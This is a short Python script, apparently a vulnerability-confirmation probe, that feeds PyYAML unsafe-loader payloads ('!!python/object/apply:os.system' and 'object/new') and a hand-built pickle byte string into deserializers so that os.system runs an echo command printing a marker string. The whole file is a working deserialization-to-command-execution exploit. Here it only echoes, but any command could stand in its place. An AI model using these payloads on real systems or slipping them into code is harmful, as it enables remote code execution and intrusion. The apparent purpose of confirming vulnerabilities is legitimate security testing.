import sys
# insert(0) pushes each new entry ahead — iterate reversed so the FIRST
# preferred dir ends up first in sys.path
for p in reversed(("/src/lib3", "/src/lib", "/src/src", "/src")):
    sys.path.insert(0, p)
try:
    import yaml
    loaders = [getattr(yaml, n) for n in ("UnsafeLoader", "Loader", "FullLoader")
               if getattr(yaml, n, None)]
    payloads = [
        "!!python/object/apply:os.system [\"echo VULN_CONFIRMED_702B770F\"]",
        "!!python/object/new:os.system [\"echo VULN_CONFIRMED_702B770F\"]",
    ]
    for L in loaders:
        for pl in payloads:
            try:
                yaml.load(pl, Loader=L)
            except Exception:
                pass
except ImportError:
    pass
import pickle
try:
    pickle.loads(b"cos\nsystem\n(S'echo VULN_CONFIRMED_702B770F'\ntR.")
except Exception:
    pass
